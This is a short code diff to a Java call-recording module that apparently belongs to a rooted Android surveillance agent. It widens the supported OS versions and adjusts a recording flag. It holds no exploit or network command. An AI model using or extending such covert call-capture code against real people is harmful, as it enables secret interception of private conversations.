@@ -98,7 +98,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private CallInfo callInfo;
 	private List<Chunk> chunks = new ArrayList<Chunk>();
 	private boolean[] finished = new boolean[2];
-	private boolean canRecord = true;
+	private boolean canRecord = false;
 	private Object recordingLock = new Object();
 
 	public static ModuleCall self() {
@@ -142,7 +142,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		if (Status.haveRoot()) {
 
-			if (android.os.Build.VERSION.SDK_INT < 15 || android.os.Build.VERSION.SDK_INT > 17) {
+			if (android.os.Build.VERSION.SDK_INT < 15 || android.os.Build.VERSION.SDK_INT > 18) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (actualStart): OS level not supported");
 				}
@@ -175,6 +175,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 					}
 					startWatchAudio();
 					canRecord = true;
+				}else{
+					canRecord = false;
 				}
 			} else {
 				if (Cfg.DEBUG) {
